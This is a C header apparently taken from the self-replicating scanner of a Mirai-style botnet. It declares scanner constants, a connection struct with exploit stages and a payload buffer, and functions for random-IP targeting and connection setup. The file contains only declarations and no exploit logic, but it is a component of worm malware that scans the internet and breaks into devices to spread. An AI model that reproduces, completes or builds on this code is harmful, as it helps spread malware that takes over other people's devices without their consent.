#ifdef SELFREP

#pragma once

#include <stdint.h>

#include "includes.h"

#define lw_n605r_SCANNER_MAX_CONNS 318
#define lw_n605r_SCANNER_RAW_PPS 720

#define lw_n605r_SCANNER_RDBUF_SIZE 830
#define lw_n605r_SCANNER_HACK_DRAIN 64

struct lw_n605r_scanner_connection
{
    int fd, last_recv;
    enum
    {
        lw_n605r_SC_CLOSED,
        lw_n605r_SC_CONNECTING,
        lw_n605r_SC_EXPLOIT_STAGE2,
        lw_n605r_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[lw_n605r_SCANNER_RDBUF_SIZE];
    char payload_buf[1024];
};

void lw_n605r_scanner_init();
void lw_n605r_scanner_kill(void);

static void lw_n605r_setup_connection(struct lw_n605r_scanner_connection *);
static ipv4_t lw_n605r_get_random_ip(void);

#endif
